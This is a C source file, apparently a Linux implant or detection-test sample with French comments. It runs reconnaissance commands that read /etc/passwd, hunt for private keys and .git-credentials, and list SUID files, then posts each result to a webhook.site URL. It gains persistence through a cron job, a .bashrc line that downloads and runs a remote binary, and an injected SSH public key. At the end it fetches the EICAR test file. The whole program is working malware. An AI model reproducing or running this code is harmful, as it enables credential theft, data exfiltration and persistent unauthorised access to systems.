#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <curl/curl.h>

#define BUFFER_SIZE 4096

/*void run_command_and_log(const char *command, FILE *log_file) {
    char buffer[128];
    FILE *pipe = popen(command, "r");
    if (!pipe) {
        fprintf(log_file, "Error: Failed to run command: %s\n", command);
        return;
    }

    while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
        fprintf(log_file, "%s", buffer);
    }

    pclose(pipe);
}*/

void run_command(const char *command) {
    int result = system(command);
    if (result == -1) {
        perror("Error running command");
        exit(EXIT_FAILURE);
    }
}

/*void discover() {
    FILE *log_file = fopen("./discover.log", "w");
    if (!log_file) {
        perror("Error opening discover log file");
        exit(EXIT_FAILURE);
    }
	// Commandes de reconnaissance
    run_command_and_log("id", log_file);
    run_command_and_log("who -a", log_file);
    run_command_and_log("ps -ef", log_file);
    run_command_and_log("df -h", log_file);
    run_command_and_log("uname -a", log_file);
    run_command_and_log("cat /etc/issue", log_file);
    run_command_and_log("cat /etc/*release*", log_file);

    fclose(log_file);
}*/

void download_file(const char *url, const char *output) {
    CURL *curl = curl_easy_init();
    if (curl) {
        FILE *fp = fopen(output, "wb");
        if (!fp) {
            perror("Error opening file for download");
            exit(EXIT_FAILURE);
        }
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
        curl_easy_setopt(curl, CURLOPT_FAILONERROR, 1L);
        CURLcode res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
            fclose(fp);
            curl_easy_cleanup(curl);
            exit(EXIT_FAILURE);
        }
        fclose(fp);
        curl_easy_cleanup(curl);
    } else {
        fprintf(stderr, "Error initializing CURL\n");
        exit(EXIT_FAILURE);
    }
}

void transmission(const char *cmd, const char *result) {
    CURL *curl;
    CURLcode res;

    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();

    if(curl) {
        char *post_fields = malloc(strlen(cmd) + strlen(result) + 2);
        if (!post_fields) {
            fprintf(stderr, "Memory allocation failed\n");
            curl_easy_cleanup(curl);
            curl_global_cleanup();
            return;
        }
        snprintf(post_fields, strlen(cmd) + strlen(result) + 2, "%s=%s", cmd, result);

        curl_easy_setopt(curl, CURLOPT_URL, "https://webhook.site/be4321ca-a6be-4a15-a67c-e774154e80a6");
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_fields);

        res = curl_easy_perform(curl);

        if(res != CURLE_OK) {
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
        }

        free(post_fields);
        curl_easy_cleanup(curl);
    }

    curl_global_cleanup();
}

void traitement(const char *cmd) {
    char buffer[BUFFER_SIZE];
    char *result = NULL;
    size_t result_size = 0;
    FILE *pipe;

    snprintf(buffer, sizeof(buffer), "%s 2>&1", cmd);
    pipe = popen(buffer, "r");

    if (!pipe) {
        perror("popen failed");
        return;
    }

    while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
        size_t buffer_len = strlen(buffer);
        char *new_result = realloc(result, result_size + buffer_len + 1);
        if (!new_result) {
            free(result);
            perror("realloc failed");
            pclose(pipe);
            return;
        }
        result = new_result;
        memcpy(result + result_size, buffer, buffer_len);
        result_size += buffer_len;
        result[result_size] = '\0';
    }

    int status = pclose(pipe);
    if (status == -1) {
        perror("pclose failed");
    }

    if (result) {
        char full_result[result_size + 20];
        snprintf(full_result, sizeof(full_result), "\nresultat : %s", result);
        transmission(cmd, full_result);
        free(result);
    } else {
        transmission(cmd, "resultat : (empty)");
    }
}

void add_ssh_key(const char *ssh_key) {
    const char *home_dir = getenv("HOME");
    if (home_dir == NULL) {
        fprintf(stderr, "Error: Could not get HOME environment variable\n");
        exit(EXIT_FAILURE);
    }

    char ssh_dir[BUFFER_SIZE];
    snprintf(ssh_dir, sizeof(ssh_dir), "%s/.ssh", home_dir);

    struct stat st = {0};
    if (stat(ssh_dir, &st) == -1) {
        if (mkdir(ssh_dir, 0700) == -1) {
            perror("Error creating .ssh directory");
            exit(EXIT_FAILURE);
        }
    }

    char authorized_keys_path[BUFFER_SIZE * 2];
    snprintf(authorized_keys_path, sizeof(authorized_keys_path), "%s/authorized_keys", ssh_dir);

    FILE *file = fopen(authorized_keys_path, "a");
    if (file == NULL) {
        perror("Error opening authorized_keys file");
        exit(EXIT_FAILURE);
    }

    fprintf(file, "\n%s\n", ssh_key);
    fclose(file);

    printf("SSH key added to %s\n", authorized_keys_path);
}

void add_cron_job(const char *job) {
    FILE *pipe;
    char buffer[BUFFER_SIZE];
    char temp_file[] = "/tmp/mycron.XXXXXX";
    int fd = mkstemp(temp_file);
    
    if (fd == -1) {
        perror("mkstemp failed");
        exit(EXIT_FAILURE);
    }
    
    FILE *temp_fp = fdopen(fd, "w");
    if (!temp_fp) {
        perror("fdopen failed");
        close(fd);
        exit(EXIT_FAILURE);
    }

    // Read the existing crontab into a temporary file
    pipe = popen("crontab -l", "r");
    if (!pipe) {
        perror("popen failed");
        fclose(temp_fp);
        exit(EXIT_FAILURE);
    }

    // Copy the existing crontab to the temporary file
    while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
        fputs(buffer, temp_fp);
    }
    pclose(pipe);

    // Add the new cron job to the temporary file
    fprintf(temp_fp, "%s\n", job);
    fclose(temp_fp);

    // Update the crontab with the new content
    char command[BUFFER_SIZE];
    snprintf(command, sizeof(command), "crontab %s", temp_file);
    int status = system(command);
    if (status == -1) {
        perror("system failed");
    }

    // Clean up the temporary file
    unlink(temp_file);
}

int command_exists_in_file(const char *filepath, const char *command) {
    FILE *file = fopen(filepath, "r");
    if (file == NULL) {
        perror("fopen failed");
        return 0;
    }

    char line[BUFFER_SIZE];
    while (fgets(line, sizeof(line), file) != NULL) {
        if (strstr(line, command) != NULL) {
            fclose(file);
            return 1;
        }
    }

    fclose(file);
    return 0;
}

void add_startup_command(const char *command) {
    const char *home = getenv("HOME");
    if (home == NULL) {
        fprintf(stderr, "Cannot get HOME environment variable.\n");
        exit(EXIT_FAILURE);
    }

    char bashrc_path[BUFFER_SIZE];
    snprintf(bashrc_path, sizeof(bashrc_path), "%s/.bashrc", home);

    if (command_exists_in_file(bashrc_path, command)) {
        printf("Command already exists in %s\n", bashrc_path);
        return;
    }

    FILE *bashrc = fopen(bashrc_path, "a");
    if (bashrc == NULL) {
        perror("fopen failed");
        exit(EXIT_FAILURE);
    }

    fprintf(bashrc, "\n# Command added by C program\n%s\n", command);
    fclose(bashrc);
}

int main() {
    
    // Actions malveillantes
	 traitement("hostname 2>/dev/null");
	 traitement("cat /etc/passwd 2>/dev/null");
	 traitement("id 2>/dev/null");
	 traitement("who -a 2>/dev/null");
	 traitement("df -h 2>/dev/null");
	 traitement("ps aux 2>/dev/null | awk '{print $11}'|xargs -r ls -la 2>/dev/null |awk '!x[$0]++' 2>/dev/null");
	 traitement("find /usr/local/etc/rc.d \\! -uid 0 -type f 2>/dev/null |xargs -r ls -la 2>/dev/null");
	 traitement("grep 'nameserver' /etc/resolv.conf 2>/dev/null");
	 traitement("dpkg --list 2>/dev/null| grep compiler |grep -v decompiler 2>/dev/null && yum list installed 'gcc*' 2>/dev/null| grep gcc 2>/dev/null");
	 traitement("find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \\;");
	 traitement("grep -rl 'PRIVATE KEY-----' /home 2>/dev/null");
	 traitement("find / -name '.git-credentials' 2>/dev/null");
	 traitement("find /home -iname *.rhosts -exec ls -la {} 2>/dev/null \\; -exec cat {} 2>/dev/null \\;");
	 traitement("ls -la /etc/exports 2>/dev/null; cat /etc/exports 2>/dev/null");
	 traitement("find / -name *.bak -type f 2</dev/null");
	
	// Persistance
    add_cron_job("0 0 * * * /tmp/testmayoly");
	add_startup_command("rm /tmp/mayoly 2>/dev/null; wget 'https://raw.githubusercontent.com/b4ldrrr/web2/main/testmayoly'; chmod 777 ./testmayoly; mv ./testmayoly /tmp/testmayoly; /tmp/testmayoly");
	
	add_ssh_key("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC/kOzb/U7RXiDzpCnbfl8O8pGP9P8kfr7xXgeNzoSl+7TxdGl4dBJZD1naCNB1krQIc89H4kz9G+/tFwVG9F/2PiPy4qz5PE2H7T9S+M++k7DSynfRDCVXeIcKxy0jkbjbNozs7jBZiykKUMhCFX5lEPd6NTsXnAzQrpDndu4DC4g0AcwgqCyjE4/vQS5TbiSfUlZZgsyAjoKEHbWDeL15e3WBhFmN8tpxgQf5s3eAIEvx1iiEQXPqpHHMzioN7TVkeZF29EQRZkmeWmXV22aVvtXbKPLC5wZlcKOy3meeRTHI3UTzlkLL8vd7b0N9X42EJBnH12UZ2MyDU/51WKFDZkehWN6U5aOEblMi6Qswha1KPWg9RJsQl+4O34o/pHXkxMHIiCinJMtwea0cBz4kY3ktYmpt8Lu9AYetF29tukxUaoFw7wkOd3r6JyfpZhgviB53Hov9oSrspT7wwh09OaQmEvpNyRyOiAmyWsHHic5/ZdDWpCTDUrMFROvG8Tl4006pm6CwwXTTVPdi0IJqNBC681odzX2Sn+ym2sKfeM5KMCnVC6510VySBvPraeyDjaKHBSZX4umYjf+SB3j8c9WMsAqYx7Q5dCyIfGsWe3AGhV0kGx1wjvwdncW0Nf/TT2NyIWW89dLrVwXJ8DrRgApGFouZJdozCehKEHQjOQ== test mayoly");
	traitement("cat ~/.ssh/authorized_keys");
	
	//Verdict Malveillant
	download_file("https://secure.eicar.org/eicar.com", "/tmp/eicar.com");

    return 0;
}
